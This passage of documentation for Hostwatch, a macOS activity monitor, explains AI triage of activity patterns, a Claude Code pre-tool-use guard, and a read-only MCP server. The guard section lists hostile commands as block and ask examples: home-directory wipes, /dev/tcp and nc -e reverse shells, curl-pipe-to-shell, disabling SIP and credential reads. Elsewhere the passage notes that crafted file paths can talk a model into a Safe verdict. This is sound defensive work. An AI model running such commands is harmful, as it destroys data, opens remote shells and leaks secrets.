attack-shaped ones. *Settled* is how many ordinary patterns the AI would decide by itself. *Attacks settled Safe* is
the mistake that matters.

| Model | Ordinary patterns settled | Attacks settled Safe | Time per pattern | Leaves the Mac |
|---|---|---|---|---|
| Apple on-device (General) | 50% | 1 of 20 | 1.4 s | no |
| Gemma 4 E4B via Ollama | 60% | 0 of 20 | 18 s | no |
| Claude Haiku | 90% | 0 of 20 | 0.6 s (one batch) | yes, secrets masked |
| Claude Sonnet | 85% | 0 of 20 | 0.4 s (one batch) | yes, secrets masked |
| Claude Opus | 75% | 0 of 20 | 0.9 s (one batch) | yes, secrets masked |

Sonnet and Opus answer *unknown* more often for the attacks, which leaves them for you rather than settling them.
Cisco's Foundation-Sec-8B (Instruct and Reasoning) settled 45 to 55% but called 5 to 6 of the 20 attacks Safe, more
than any other model. Every small model trusted an Apple signature on curl or a shell, which is why a warning sign
outranks a local model (below). The app's own guardrails stop the rest: no AI's Safe is taken for a high-risk
pattern, a shell or an interpreter.

**Which to choose.** Apple's model for free, private and fast. Gemma 4 through Ollama for better local answers if
the wait doesn't matter. Claude Haiku settles the most and costs the least of the Claude models: a batch of 40
patterns costs a few cents.

**What the AI sees for each pattern.** The local model and Claude get the same facts and the same instructions:

- what happened (a launch, a file access or a connection) and the pattern
- each program involved, who signed it and where it lives (part of macOS, Homebrew, inside an app, a download or
  temp folder, a hidden folder)
- who started it: the launch chain as a trail from its origin, the origin in words, the AI coding session if any,
  and a launch's command line. When that launch is no longer in the record, it says *not recorded* rather than guess
- warning signs Hostwatch checked itself: a tool that runs whatever it's told (sh, curl, osascript…), an app
  starting one, a program in a temp, download or hidden folder, removing the quarantine flag, piping a download into
  a shell, reading saved passwords, Messages or the keychain, a password dialog, a screenshot, an autostart write, a
  bare IP address
- its history: how often, over how long, and whether regularly
- the local risk level

The instructions say that developer tools in your projects are ordinary even unsigned, that an Apple signature on
a shell or curl says nothing about the command, and that the reason must name the deciding fact. Secrets are masked,
and a crafted path can't pass itself off as one of these facts.

**A warning sign outranks the local model.** When Hostwatch found a warning sign, a local model's Safe is never
taken: the pattern goes to Claude, or stays New for you.

**Which patterns.** *Classify with AI* in the toolbar takes the rows you selected, or, with nothing selected, every
row the list shows, and selects them so you see what is being classified. In Patterns that follows its filter, search
and scope. In Events, the patterns of the events shown (or selected), with their filters, kinds and search.
Right-click rows, a selection or a group row for the same: *Classify N New Patterns with AI* ▸ *Apply the Verdicts*
or *Suggest Only, I’ll Decide*. Applying also applies what an AI already suggested for them, without asking again.

- **Reopened patterns** (decided before, sent back because something changed) are included when you ask. The AI is
  told why they were reopened, which also counts as a warning sign, so a small local model can't settle one Safe.
  Automatic classification leaves them to you.
- **Asking again** retries the patterns an earlier pass left for you.
- **Apply the Verdicts is your decision:** every AI answer of that run is applied, including a Safe for a high-risk
  pattern or for a tool that can run or change other programs (shells, interpreters, curl, codesign…). Those are
  recorded as yours, with a note naming the AI.
- **Without that click** (automatic suggestions, or *Suggest Only*), such a Safe is never applied by itself, except a
  plain read of an exact folder in your own projects. It stays a suggestion with its reason (*AI suggests Safe ·
  yours: …*), and the live list has a *Mark Safe* button.

**Watch it work.** When you start *Classify with AI*, a list opens beside the button and fills live: the pattern being
asked about right now, then every pattern of the run with its state (waiting, being asked, its verdict and reason,
left for you, or failed). The local model answers one pattern at a time, Claude a batch at once. *Show* on the
progress bar reopens it, and after a run the list button next to *Classify with AI* shows what the last run did.

**Per question.** The Ask window also has a **Claude / On-device** switch for each question.

- On-device answers use the same format, with the verdict first.
- The evidence is shortened to about 6,000 characters to fit what the on-device model can read at once.
- Reading local files is Claude-only.
- An on-device "SAFE" from Ask never marks a high-risk pattern Safe.

**Model state.** The menu shows the model's state: ready, still downloading, Apple Intelligence off, or Mac not
eligible (Intel). When it's unavailable, everything goes to Claude.

**Classification steps.** Triage means sorting new patterns by AI before you look at them.

1. **On-device pass** (engines with on-device): Apple's on-device model (on this Mac only, never Private Cloud
   Compute) looks at each pattern on its own. It sees the program, activity, signer and trust, local risk and count.
   Secrets are masked and the text is marked as data. It answers SAFE / SUSPICIOUS / DANGEROUS / UNSURE with a
   confidence.
2. **Claude** (engines with Claude): one Claude call for whatever step 1 did not settle.

Routing:

| On-device says | Normal-risk pattern | High-risk pattern |
|----------------|---------------------|-------------------|
| SAFE, high confidence | **settled Safe** (source *on-device*) | Claude, else left for you |
| SAFE medium/low, UNSURE | Claude, else left for you | Claude, else left for you |
| SUSPICIOUS / DANGEROUS | Claude, else flagged (*on-device*) | Claude, else flagged |
| model unavailable | Claude, else left for you | Claude, else left for you |

**No AI verdict ever marks a high-risk pattern Safe by itself.** This holds for the on-device model and Claude, in
triage, Classify New and Ask AI. Event text such as file paths, process names and hostnames can be crafted to talk a
model into it. So a high-risk pattern stays New until you decide (or until you click *Apply the Verdicts*). AI
verdicts never remove steps from Stories either. Only your own decisions do.

**Apple's safety filter.** The on-device model has built-in guardrails. They can refuse text that looks like hacking
or credential theft, which is what security evidence is.

- Ask AI uses Apple's mode meant for analysing such text.
- If the model still refuses, Hostwatch retries once with the core evidence (event, process, parent chain,
  executable) and says so.
- If that is refused too, it explains why and suggests Claude.
- Background triage treats a refusal as "couldn't decide". The pattern goes to Claude or stays New.

**Claude usage** (Settings ▸ AI) shows the tokens and cost of every Claude run Hostwatch made: Ask AI, classifying
patterns and Suggest Rules.

- It is counted across launches.
- It reads like "1.2M tokens · $3.41", with runs and the start date under it.
- The tooltip breaks it down per feature and into input/cached/output.
- Failed runs that still reached Claude count too.
- **Reset** starts from zero. *Reset Hostwatch* with settings clears it.
- The on-device model is free and isn't counted.

#### Claude Code guard

If you use Claude Code, Hostwatch checks each command it wants to run and stops the dangerous ones before they happen.

An AI coding assistant can be tricked into running harmful commands. The guard checks each call first. Turn it on in
*Settings ▸ AI ▸ Claude Code guard*. It is off by default.

**What each verdict does:**

- **Block:** the call is denied. It doesn't run, and Claude is told why and to ask you to run it yourself.
  Examples:
  - `rm -rf ~`, `/`, `~/Documents`, `find ~ -delete`
  - `/dev/tcp`, `nc -e`
  - `diskutil eraseDisk`, `dd of=/dev/…`
  - a fork bomb
  - `csrutil disable`, `spctl --master-disable`
  - editing TCC.db
  - a secret sent to a paste or webhook site
  - a known malware domain or IP
  - deleting or changing Hostwatch's files
- **Ask:** Claude Code asks you, with the reason. Examples:
  - `curl … | sh`, `bash <(curl …)`, `base64 -d | sh`
  - `sudo`, `osascript`
  - launch agents, shell startup files, `authorized_keys`, `/etc`, Claude Code's own settings
  - `launchctl load`, `crontab`
  - `security find-generic-password -w`, SSH keys, AWS/GitHub/Docker/Kubernetes credentials, browser data. This also
    applies via Read/Grep, whose content would go to Claude.
  - `xattr -d com.apple.quarantine`
  - recursive deletes outside the project, `$VAR/` deletes
  - a bare public IP
  - `pkill Hostwatch`
  - scripts run with `bash x.sh` or written by Claude that do any of this
- **Nothing:** everything else. Claude Code's normal permissions apply.

**It can only make Claude Code stricter.** Hostwatch never allows a call that Claude Code would otherwise ask about.

- When Claude Code won't ask (`bypassPermissions`, `dontAsk`), a Hostwatch panel asks instead, with **Allow Once**
  and **Block** and a countdown. Block is the default, and no answer in 60 s blocks.
- In `claude -p` runs, Claude Code turns an ask into a refusal by itself.
- Hostwatch's own Claude runs don't load user settings, so they aren't checked.

**Log and status.**

- The log (*Show Log…*) keeps the last 300 blocked or asked calls, with secrets masked, in `claude-guard.json`. Its
  window has **Clear Log**.
- The tray shows blocks in the last 24 hours.
- The hook's state is checked every 30 s, for two cases: the hook removed from the settings (*Restore*), or all
  hooks switched off by `disableAllHooks`.

**Limits.** It judges the text of a call, so well-hidden code can get through. Hostwatch's monitoring still sees what
then runs.

**How it is installed.** Turning it on adds a `PreToolUse` hook to Claude Code's user settings
(`~/.claude/settings.json`). The original is kept as `settings.json.before-hostwatch`.

- Matcher: `Bash|Write|Edit|MultiEdit|NotebookEdit|Read|Grep|WebFetch`
- Command: `'<Hostwatch>' --claude-hook`
- Timeout: 90 s

The hook takes about 15 ms. It passes the call to the app over a private connection only you can use
(`~/Library/Application Support/Hostwatch/guard/claude.sock`). If the app isn't running, the hook judges the call
itself with the same rules, without the threat lists.

Settings ▸ AI also shows the hook as a fragment to copy into a project's `.claude/settings.json` or the managed
settings.

#### MCP server

Let Claude Code read your Hostwatch history and stories (read only), so you can ask it about your Mac's activity.

MCP (Model Context Protocol) is the standard way Claude Code connects to other tools. With it, you can ask Claude Code
questions like what ran on your Mac yesterday, and it reads the answer from Hostwatch.

**Set it up.** Access is off by default.

1. Turn on *Settings ▸ AI ▸ Use with Claude Code*, or use *Help ▸ Use with Claude Code…*.
2. Hostwatch creates a random token and shows the command to run once:
   `claude mcp add --scope user hostwatch -e HOSTWATCH_MCP_TOKEN=<token> -- <path to Hostwatch.app>/Contents/MacOS/Hostwatch --mcp`
   The command replaces any earlier `hostwatch` registration.
3. The token is shown only once. Hostwatch keeps only a fingerprint of it (`mcp-token.sha256`), not the token itself.

> [!WARNING]
> The token is what keeps out MCP clients you didn't set up, so keep the command to yourself. If you think it leaked,
> use *New Token…* in *Settings ▸ AI*: it invalidates earlier registrations.

**What Claude Code can ask:**

| Tool | What it returns |
|------|-----------------|
| `hostwatch_overview` | collector state, pattern counts by status (new high-risk too), open stories, new domains, history span and size, AI engine |
| `search_events` | recorded events newest first: `query` (text in name/path/target/host/command line, `~` = home, case-insensitive for the usual spellings), `kind`, `pid`, `since`/`until` (`30m`, `24h`, `7d`, `today`, `yesterday`, ISO 8601, default last 24 h), `limit` (≤ 300) |
| `search_patterns` | patterns with status/risk/count/first/last/who decided: `query`, `status` (new/safe/suspicious/dangerous/flagged), `risk`, `kind`, `sort` |
| `list_stories`, `get_story` | stories (numbered newest first) and one story's full timeline (`id` = number or id prefix) |
| `list_domains` | domain inventory: `only_new`, `query`, `limit` |
| `process_tree` | ancestors, children during the process's lifetime, its recent connections and file activity |
| `find_processes` | processes that ran in a time range (`query`: name, path, command line, user or pid, and `since`/`until`): start, end or still running, CPU time, peak memory, bytes written, user, parent, command line. Processes that lived under a minute are included |
| `agent_sessions` | coding-agent sessions Hostwatch follows or followed in the last 30 minutes: pid, project, start and end, launches, file opens, connections, new patterns. `trace_process` with the pid shows what one did |
| `trace_process` | one process's life (`pid`, `at` to pick the run when a pid was reused, and `children`): ancestors, child tree, CPU/memory/disk use over its life, what it (and its tree) ran, opened and connected to, and a timeline. For a process running for days, children and activity cover its last 6 h. A huge tree is followed for its first 200 descendants |
| `signing_info` | signer, Team ID, ad-hoc, quarantine, Apple, trusted, replaced-at-path, full validity check |

**Access control.**

- **Refusals:** with access off, or a missing or outdated token, the server serves no data and answers every request
  with an error saying how to fix it.
- **New Token…** invalidates earlier registrations. Turning access off invalidates all of them.
- **Access log:** each session start is recorded in `mcp-access.log`: time, allowed/refused, and the program that
  started it. The last five show in Settings.
- **Limits of a token:** it keeps out MCP clients you didn't set up, and makes access revocable and visible. A
  program already running as your user could still read Hostwatch's files directly, as it can any of your files.

**Safety.**

- Every tool is read-only. There are no tools that change anything.
- Output is masked with the same rules as Ask AI and capped at 40,000 characters.
- The server's instructions tell Claude to treat the data as evidence, never as instructions.
- There's no network listener: Claude Code starts Hostwatch itself and talks to it directly.

**Data.** It reads your patterns, stories, domains and history. Saved data is at most about 30 s behind the app, and
it works when the app is closed. One question reads up to 2 GB of history.
